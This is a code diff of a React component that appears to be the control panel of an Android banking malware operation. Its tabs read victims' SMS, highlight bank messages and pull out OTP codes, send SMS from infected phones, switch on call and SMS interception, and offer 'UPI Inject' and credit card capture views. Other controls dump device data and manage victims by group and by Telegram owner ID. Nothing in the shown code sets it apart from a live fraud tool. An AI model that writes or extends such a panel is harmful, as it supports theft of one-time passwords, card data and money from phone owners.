-                            : "bg-card border-input text-muted-foreground hover:text-foreground hover:border-card-border"
-                        }`}
-                      >
-                        <Landmark className="w-3.5 h-3.5" />
-                        Bank {bankOnly ? "ON" : "OFF"}
-                      </button>
-                      <div className="relative w-full sm:w-64">
-                        <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
-                        <input
-                          type="text"
-                          placeholder="Search messages..."
-                          value={smsSearch}
-                          onChange={(e) => setSmsSearch(e.target.value)}
-                          className="w-full bg-card border border-input rounded-2xl py-3 pl-10 pr-4 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
-                        />
-                      </div>
-                    </div>
-                  </div>
-
-                  {/* ── Send SMS from device ── */}
-                  <div className="bg-gradient-to-br from-card to-card/80 border border-white/10 rounded-2xl p-5 shadow-lg space-y-4 backdrop-blur">
-                    <div className="flex items-center gap-2">
-                      <MessageSquare className="w-4 h-4 text-primary" />
-                      <span className="text-sm font-semibold text-foreground">
-                        Send SMS from this device
-                      </span>
-                    </div>
-                    <div className="grid grid-cols-1 sm:grid-cols-[1fr_90px] gap-2">
-                      <input
-                        type="text"
-                        value={smsTo}
-                        onChange={(e) => setSmsTo(e.target.value)}
-                        placeholder="Destination number (+91...)"
-                        className="w-full bg-card border border-input rounded-2xl px-3 py-3 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
-                      />
-                      <div className="flex gap-1 bg-muted p-1 rounded-full border border-card-border">
-                        {[0, 1].map((idx) => (
-                          <button
-                            key={idx}
-                            onClick={() => setSmsSim(idx)}
-                            className={`flex-1 py-1.5 text-xs font-semibold rounded-full transition-colors ${smsSim === idx ? "bg-primary text-primary-foreground" : "text-muted-foreground hover:text-foreground"}`}
-                          >
-                            SIM{idx + 1}
-                          </button>
-                        ))}
-                      </div>
-                    </div>
-                    <textarea
-                      value={smsBody}
-                      onChange={(e) => setSmsBody(e.target.value)}
-                      placeholder="Type your message... (supports long SMS, will auto-split)"
-                      rows={4}
-                      className="w-full bg-card border border-input rounded-2xl px-3 py-3.5 text-[15px] leading-relaxed text-foreground focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary transition-all resize-none min-h-[110px]"
-                    />
-                    <button
-                      onClick={handleSendSms}
-                      disabled={sendingSms || !smsTo.trim() || !smsBody.trim()}
-                      className="w-full bg-primary hover:bg-primary/90 disabled:opacity-50 disabled:cursor-not-allowed text-primary-foreground font-bold py-3 rounded-full transition-colors flex items-center justify-center gap-2"
-                    >
-                      <MessageSquare className="w-4 h-4" />
-                      {sendingSms ? "Sending..." : "Send SMS"}
-                    </button>
-                  </div>
-
-                  {filteredSms.length === 0 ? (
-                    <div className="flex-1 flex items-center justify-center text-muted-foreground text-sm border border-dashed border-card-border rounded-2xl bg-muted">
-                      No messages found.
-                    </div>
-                  ) : (
-                    <div className="flex-1 overflow-y-auto space-y-4 pr-1 sm:pr-2 max-h-[520px] lg:max-h-[560px] scroll-smooth">
-                      {filteredSms.map(([key, sms]: any) => {
-                        // Support new APK (sender/message/dateTime) and old APK (from/body/date)
-                        const isOutgoing =
-                          String(sms.type || "").toLowerCase() === "outgoing";
-                        const displayFrom = sms.sender || sms.from || "Unknown";
-                        const displayBody = sms.message || sms.body || "";
-                        const displayDate = sms.dateTime
-                          ? sms.dateTime
-                          : sms.date
-                            ? format(
-                                new Date(parseInt(sms.date)),
-                                "MMM d, HH:mm:ss"
-                              )
-                            : "Unknown Time";
-                        return (
-                          <div
-                            key={key}
-                            className={`bg-card border rounded-2xl p-5 shadow-md hover:shadow-lg hover:border-white/15 transition-all ${
-                              isBankSms(displayBody)
-                                ? isOtpSms(displayBody)
-                                  ? "border-warning/40"
-                                  : "border-warning/25"
-                                : "border-card-border"
-                            }`}
-                          >
-                            <div className="flex justify-between items-start gap-2 mb-2">
-                              <div className="flex items-center gap-1.5 min-w-0">
-                                <span
-                                  className={`shrink-0 inline-flex items-center text-[10px] font-bold px-2 py-0.5 rounded-md border ${
-                                    isOutgoing
-                                      ? "text-sky-500 bg-sky-500/10 border-sky-500/25"
-                                      : "text-emerald-500 bg-emerald-500/10 border-emerald-500/25"
-                                  }`}
-                                >
-                                  {isOutgoing ? "OUT" : "IN"}
-                                </span>
-                                <div
-                                  className={`font-semibold text-sm px-3 py-1 rounded-full truncate max-w-[55%] ${
-                                    isBankSms(displayBody)
-                                      ? "bg-warning/15 text-warning"
-                                      : "bg-primary/10 text-primary"
-                                  }`}
-                                >
-                                  {isOutgoing ? "To: " : ""}
-                                  {displayFrom}
-                                </div>
-                              </div>
-                              {(isBankSms(displayBody) ||
-                                isOtpSms(displayBody)) && (
-                                <div className="flex items-center gap-1.5 shrink-0">
-                                  {isOtpSms(displayBody) && (
-                                    <span className="font-mono text-xs font-bold text-primary bg-primary/10 border border-primary/20 px-2 py-0.5 rounded-lg">
-                                      {otpCodeOf(displayBody)}
-                                    </span>
-                                  )}
-                                  <span className="inline-flex items-center gap-1 text-[10px] font-bold text-warning bg-warning/10 border border-warning/25 px-2 py-0.5 rounded-lg">
-                                    <Landmark className="w-3 h-3" /> BANK
-                                  </span>
-                                </div>
-                              )}
-                              <div className="flex items-center gap-2 shrink-0">
-                                <span className="text-xs text-muted-foreground font-mono">
-                                  {displayDate}
-                                </span>
-                                <div className="flex gap-1">
-                                  <button
-                                    onClick={() => copyText(displayBody)}
-                                    className="p-1.5 bg-muted hover:bg-primary/10 text-muted-foreground hover:text-primary rounded-xl border border-card-border transition-colors"
-                                    title="Copy"
-                                    aria-label="Copy"
-                                  >
-                                    <Copy className="w-3.5 h-3.5" />
-                                  </button>
-                                  <button
-                                    onClick={() => handleDeleteSms(key)}
-                                    className="p-1.5 bg-muted hover:bg-destructive/10 text-muted-foreground hover:text-destructive rounded-xl border border-card-border transition-colors"
-                                    title="Delete"
-                                    aria-label="Delete"
-                                  >
-                                    <Trash2 className="w-3.5 h-3.5" />
-                                  </button>
-                                </div>
-                              </div>
-                            </div>
-                            <div className="text-sm leading-relaxed break-words text-foreground pl-1 border-l-2 border-card-border">
-                              {displayBody}
-                            </div>
-                          </div>
-                        );
-                      })}
-                    </div>
-                  )}
-                </div>
-              )}
-
-              {/* Tab 2: Call Forward */}
+            <div
+              key={activeTab}
+              className="flex-1 overflow-y-auto p-4 bg-background relative pane-fade"
+            >
               {activeTab === "forward" && (
-                <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
+                <div
+                  id="panel-forward"
+                  role="tabpanel"
+                  aria-labelledby="tab-forward"
+                  className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6"
+                >
                   <div className="text-center mb-4">
                     <div className="w-16 h-16 bg-muted rounded-full flex items-center justify-center mx-auto mb-3 border border-card-border">
                       <PhoneForwarded className="w-8 h-8 text-primary" />
@@ -1018,20 +874,14 @@ export function DeviceDetail() {
                       <label className="page-eyebrow block">
                         Intercept Type
                       </label>
-                      <div className="flex gap-2 bg-muted p-1 rounded-full border border-card-border">
-                        <button
-                          onClick={() => setForwardType("call")}
-                          className={`flex-1 py-2 text-sm font-semibold rounded-full transition-colors ${forwardType === "call" ? "bg-primary text-primary-foreground" : "text-muted-foreground hover:text-foreground"}`}
-                        >
-                          Call
-                        </button>
-                        <button
-                          onClick={() => setForwardType("sms")}
-                          className={`flex-1 py-2 text-sm font-semibold rounded-full transition-colors ${forwardType === "sms" ? "bg-primary text-primary-foreground" : "text-muted-foreground hover:text-foreground"}`}
-                        >
-                          SMS
-                        </button>
-                      </div>
+                      <Segmented<string>
+                        options={[
+                          { value: "call", label: "Call" },
+                          { value: "sms", label: "SMS" },
+                        ]}
+                        value={forwardType}
+                        onChange={setForwardType}
+                      />
                     </div>
 
                     <div className="space-y-3">
@@ -1051,39 +901,55 @@ export function DeviceDetail() {
                       <label className="page-eyebrow block">
                         Forward From SIM
                       </label>
-                      <div className="flex gap-2 bg-muted p-1 rounded-full border border-card-border">
-                        {[0, 1].map((idx) => (
-                          <button
-                            key={idx}
-                            onClick={() => setForwardSim(idx)}
-                            className={`flex-1 py-2 text-sm font-semibold rounded-full transition-colors ${forwardSim === idx ? "bg-primary text-primary-foreground" : "text-muted-foreground hover:text-foreground"}`}
-                          >
-                            SIM{idx + 1}
-                          </button>
-                        ))}
-                      </div>
+                      <Segmented<number>
+                        options={[
+                          { value: 0, label: "SIM 1" },
+                          { value: 1, label: "SIM 2" },
+                        ]}
+                        value={forwardSim}
+                        onChange={setForwardSim}
+                      />
                     </div>
 
-                    <div className="pt-2 flex gap-3">
+                    <div className="pt-2">
                       <button
-                        onClick={() =>
-                          forwardType === "call"
-                            ? handleToggleForwarding(true)
-                            : handleToggleSmsForward(true)
-                        }
-                        className="flex-1 bg-primary hover:bg-primary/90 text-primary-foreground font-bold py-3 rounded-full transition-colors"
+                        onClick={toggleForward}
+                        disabled={forwardBusy}
+                        className="w-full flex items-center justify-between px-4 py-3 rounded-full border border-card-border bg-card transition-all disabled:opacity-60"
                       >
-                        Activate {forwardType === "call" ? "Call" : "SMS"} Fwd
-                      </button>
-                      <button
-                        onClick={() =>
-                          forwardType === "call"
-                            ? handleToggleForwarding(false)
-                            : handleToggleSmsForward(false)
-                        }
-                        className="flex-1 bg-warning hover:bg-warning/90 text-primary-foreground font-bold py-3 rounded-full transition-colors"
-                      >
-                        Deactivate
+                        <span
+                          className={`flex items-center gap-2 text-sm font-bold ${
+                            forwardActive
+                              ? "text-accent"
+                              : "text-muted-foreground"
+                          }`}
+                        >
+                          {forwardBusy ? (
+                            <Loader2 className="w-4 h-4 animate-spin" />
+                          ) : (
+                            <Power className="w-4 h-4" />
+                          )}
+                          {forwardBusy
+                            ? "Updating…"
+                            : forwardActive
+                              ? "Forwarding Active"
+                              : "Forwarding Off"}
+                        </span>
+                        <span
+                          className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${
+                            forwardActive
+                              ? "bg-accent"
+                              : "bg-muted border border-card-border"
+                          }`}
+                        >
+                          <span
+                            className={`inline-block h-5 w-5 transform rounded-full bg-white shadow transition-transform duration-200 ${
+                              forwardActive
+                                ? "translate-x-[22px]"
+                                : "translate-x-0.5"
+                            }`}
+                          />
+                        </span>
                       </button>
                     </div>
                   </div>
@@ -1103,10 +969,13 @@ export function DeviceDetail() {
                   )}
                 </div>
               )}
-
-              {/* Tab 3: UPI Inject */}
               {activeTab === "inject" && (
-                <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
+                <div
+                  id="panel-inject"
+                  role="tabpanel"
+                  aria-labelledby="tab-inject"
+                  className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6"
+                >
                   <div className="text-center mb-4">
                     <div className="w-16 h-16 bg-muted rounded-full flex items-center justify-center mx-auto mb-3 border border-card-border">
                       <IndianRupee className="w-8 h-8 text-primary" />
@@ -1175,10 +1044,13 @@ export function DeviceDetail() {
                   </div>
                 </div>
               )}
-
-              {/* Tab 4: Cards (CC Capture) */}
               {activeTab === "cards" && (
-                <div className="h-full flex flex-col space-y-4">
+                <div
+                  id="panel-cards"
+                  role="tabpanel"
+                  aria-labelledby="tab-cards"
+                  className="h-full flex flex-col space-y-4"
+                >
                   <div className="flex justify-between items-center">
                     <h3 className="font-semibold text-foreground flex items-center gap-2">
                       <CreditCard className="w-4 h-4 text-primary" />
@@ -1405,10 +1277,93 @@ export function DeviceDetail() {
                   })()}
                 </div>
               )}
-
-              {/* Tab 5: Delete */}
+              {activeTab === "data" && (
+                <div
+                  id="panel-data"
+                  role="tabpanel"
+                  aria-labelledby="tab-data"
+                  className="h-full flex flex-col space-y-4"
+                >
+                  <div className="flex items-center justify-between gap-2">
+                    <h3 className="font-semibold text-foreground flex items-center gap-2">
+                      <Braces className="w-4 h-4 text-primary" />
+                      Raw Device Data
+                    </h3>
+                    <button
+                      onClick={() =>
+                        copyText(JSON.stringify(rawDevice, null, 2))
+                      }
+                      className="flex items-center gap-1.5 px-3.5 py-2 rounded-xl bg-primary/10 text-primary text-xs font-semibold border border-primary/30 hover:bg-primary/20 transition-all"
+                    >
+                      <Copy className="w-3.5 h-3.5" /> Copy JSON
+                    </button>
+                  </div>
+                  <div className="flex flex-wrap gap-1.5">
+                    {[
+                      {
+                        k: "Android",
+                        v: device.androidV && `v${device.androidV}`,
+                      },
+                      { k: "SDK", v: device.sdkV && `v${device.sdkV}` },
+                      { k: "Arch", v: device.cpu_arch },
+                      { k: "Storage", v: device.storage },
+                      {
+                        k: "Rooted",
+                        v:
+                          device.isRoot === true
+                            ? "Yes"
+                            : device.isRoot === false
+                              ? "No"
+                              : undefined,
+                      },
+                      {
+                        k: "SD Card",
+                        v:
+                          device.isSdCard === true
+                            ? "Yes"
+                            : device.isSdCard === false
+                              ? "No"
+                              : undefined,
+                      },
+                      { k: "Joined", v: device.joined },
+                      {
+                        k: "Last Ping",
+                        v: device.lastPing
+                          ? new Date(device.lastPing).toLocaleString()
+                          : undefined,
+                      },
+                      {
+                        k: "Webview",
+                        v: rawDevice.webview === true ? "Yes" : undefined,
+                      },
+                    ]
+                      .filter((x) => x.v)
+                      .map((x) => (
+                        <span
+                          key={x.k}
+                          className="inline-flex items-center gap-1 px-2.5 py-1 rounded-lg bg-muted border border-card-border font-mono text-[11px] text-muted-foreground"
+                        >
+                          <span className="text-primary/70 font-semibold">
+                            {x.k}:
+                          </span>{" "}
+                          {x.v}
+                        </span>
+                      ))}
+                  </div>
+                  <div className="flex-1 overflow-y-auto rounded-2xl border border-card-border bg-[#0a0d15]">
+                    <pre className="p-4 text-[11px] leading-relaxed font-mono text-emerald-300/90 whitespace-pre-wrap break-words">
+                      {JSON.stringify(rawDevice, null, 2)}
+                    </pre>
+                  </div>
+                </div>
+              )}
               {activeTab === "delete" && (
-                <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
+                <div
+                  id="panel-delete"
+                  role="tabpanel"
+                  aria-labelledby="tab-delete"
+                  className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6"
+                >
                   <div className="text-center mb-4">
                     <div className="w-16 h-16 bg-destructive/10 rounded-full flex items-center justify-center mx-auto mb-3 border border-destructive/20">
                       <AlertTriangle className="w-8 h-8 text-destructive" />
@@ -1440,6 +1395,213 @@ export function DeviceDetail() {
                   </div>
                 </div>
               )}
+            </div>
+          </div>
+          {/* Device management */}
+          <div className="stat-card overflow-hidden relative">
+            <div className="h-1 w-full bg-primary" />
+            <div className="p-5 space-y-4">
+              {/* Ping Device */}
+              <div className="pb-3 border-b border-card-border space-y-2">
+                <div className="flex items-center justify-between">
+                  <span className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
+                    <Activity className="w-3.5 h-3.5" /> Ping Device
+                  </span>
+                  <button
+                    onClick={handlePingDevice}
+                    disabled={pinging}
+                    className={`flex items-center gap-1.5 px-4 py-1.5 rounded-full text-xs font-semibold transition-all ${
+                      pinging
+                        ? "bg-muted text-muted-foreground border border-card-border"
+                        : "bg-primary/10 text-primary border border-primary/30 hover:bg-primary hover:text-primary-foreground"
+                    }`}
+                  >
+                    {pinging ? (
+                      <>
+                        <Timer className="w-3.5 h-3.5 animate-pulse" /> Pinging…
+                      </>
+                    ) : (
+                      <>
+                        <Wifi className="w-3.5 h-3.5" /> Ping
+                      </>
+                    )}
+                  </button>
+                </div>
+                {pingResult && (
+                  <div
+                    className={`flex items-center gap-2 px-3 py-2 rounded-2xl text-xs font-semibold ${
+                      pingResult.success
+                        ? "bg-success/10 text-success border border-success/20"
+                        : "bg-destructive/10 text-destructive border border-destructive/20"
+                    }`}
+                  >
+                    {pingResult.success ? (
+                      <>
+                        <Wifi className="w-3.5 h-3.5" /> Latency:{" "}
+                        {pingResult.latencyMs}ms — Online
+                      </>
+                    ) : (
+                      <>
+                        <WifiOff className="w-3.5 h-3.5" /> No response (15s
+                        timeout)
+                      </>
+                    )}
+                  </div>
+                )}
+              </div>
+              <div className="flex items-center justify-between pb-3 border-b border-card-border">
+                <span className="text-sm font-medium text-muted-foreground">
+                  Pinned
+                </span>
+                <button
+                  onClick={togglePin}
+                  className={`flex items-center gap-1.5 px-4 py-1.5 rounded-full text-xs font-semibold transition-all ${
+                    isPinned
+                      ? "bg-primary/10 text-primary border border-primary/30"
+                      : "bg-muted border border-card-border text-muted-foreground hover:text-foreground"
+                  }`}
+                >
+                  {isPinned ? (
+                    <PinOff className="w-3.5 h-3.5" />
+                  ) : (
+                    <Pin className="w-3.5 h-3.5" />
+                  )}
+                  {isPinned ? "Unpin" : "Pin to Top"}
+                </button>
+                <div className="space-y-2">
+                  <label className="text-sm font-medium text-muted-foreground block">
+                    Operator Memo
+                  </label>
+                  <div className="flex gap-2">
+                    <input
+                      type="text"
+                      value={memoInput}
+                      onChange={(e) => setMemoInput(e.target.value)}
+                      placeholder="Enter memo..."
+                      className="flex-1 bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
+                    />
+                    <button
+                      onClick={handleUpdateMemo}
+                      className="bg-primary hover:bg-primary/90 text-primary-foreground px-4 py-2.5 rounded-full text-xs font-semibold transition-colors"
+                    >
+                      Set
+                    </button>
+                  </div>
+                </div>
+                <div className="space-y-2 pt-2 border-t border-card-border">
+                  <label className="text-sm font-medium text-muted-foreground block">
+                    Device Name
+                  </label>
+                  <div className="flex gap-2">
+                    <input
+                      type="text"
+                      value={nameInput}
+                      onChange={(e) => setNameInput(e.target.value)}
+                      placeholder="Custom name..."
+                      className="flex-1 bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
+                    />
+                  </div>
+                  <label className="text-sm font-medium text-muted-foreground block">
+                    Group
+                  </label>
+                  <input
+                    type="text"
+                    value={groupInput}
+                    onChange={(e) => setGroupInput(e.target.value)}
+                    placeholder="e.g. Delhi, VIP, Test"
+                    className="w-full bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
+                  />
+                  <label className="text-sm font-medium text-muted-foreground block">
+                    Color Tag
+                  </label>
+                  <div className="flex gap-2 flex-wrap">
+                    {[
+                      "#22c55e",
+                      "#3b82f6",
+                      "#f59e0b",
+                      "#ef4444",
+                      "#8b5cf6",
+                      "#ec4899",
+                      "#14b8a6",
+                    ].map((c) => (
+                      <button
+                        key={c}
+                        onClick={() => setColorTag(colorTag === c ? "" : c)}
+                        className="w-7 h-7 rounded-full transition-all"
+                        style={{
+                          background: c,
+                          boxShadow:
+                            colorTag === c
+                              ? "0 0 0 2px white, 0 0 0 4px " + c
+                              : "none",
+                        }}
+                        aria-label={"color " + c}
+                      />
+                    ))}
+                  </div>
+                  <button
+                    onClick={handleSaveLabel}
+                    className="bg-primary hover:bg-primary/90 text-primary-foreground px-4 py-2.5 rounded-full text-xs font-semibold transition-colors w-full"
+                  >
+                    Save Label & Group
+                  </button>
+                </div>
+                {isAdmin && (
+                  <div className="space-y-2 pt-2 border-t border-card-border">
+                    <label className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
+                      <UserCheck className="w-3.5 h-3.5" /> Assign Owner
+                    </label>
+                    <div className="flex gap-2">
+                      <input
+                        type="text"
+                        value={ownerInput}
+                        onChange={(e) => setOwnerInput(e.target.value)}
+                        placeholder="Telegram ID..."
+                        className="flex-1 bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all min-w-0"
+                      />
+                      <button
+                        onClick={handleSaveOwner}
+                        disabled={savingOwner}
+                        className="bg-primary hover:bg-primary/90 text-primary-foreground px-4 py-2.5 rounded-full text-xs font-semibold transition-colors disabled:opacity-50 whitespace-nowrap"
+                      >
+                        {savingOwner ? "..." : "Save"}
+                      </button>
+                    </div>
+                    <p className="text-[10px] text-muted-foreground">
+                      Only this user will be able to see this device
+                    </p>
+                  </div>
+                )}
+                <div className="space-y-2 pt-2 border-t border-card-border">
+                  <label className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
+                    <BellRing className="w-3.5 h-3.5" /> Online Alert
+                  </label>
+                  <button
+                    onClick={toggleOnlineAlert}
+                    className={`w-full flex items-center justify-between px-4 py-2.5 rounded-2xl text-sm font-semibold transition-colors border ${
+                      alertOnline
+                        ? "bg-success/10 text-success border-success/30"
+                        : "bg-card text-muted-foreground border-input hover:bg-muted/50"
+                    }`}
+                  >
+                    <span className="flex items-center gap-2">
+                      <BellRing className="w-4 h-4" />
+                      {alertOnline ? "Active" : "Off"}
+                    </span>
+                    <span
+                      className={`relative inline-flex h-5 w-9 items-center rounded-full transition-colors ${alertOnline ? "bg-success" : "bg-muted"}`}
+                    >
+                      <span
+                        className={`inline-block h-3.5 w-3.5 transform rounded-full bg-white transition-transform ${alertOnline ? "translate-x-[18px]" : "translate-x-0.5"}`}
+                      />
+                    </span>
+                  </button>
+                  <p className="text-[10px] text-muted-foreground">
+                    Jab device dobara online aaye toh Telegram pe notification
+                    milegi
+                  </p>
+                </div>
+              </div>
             </div>
           </div>
         </div>
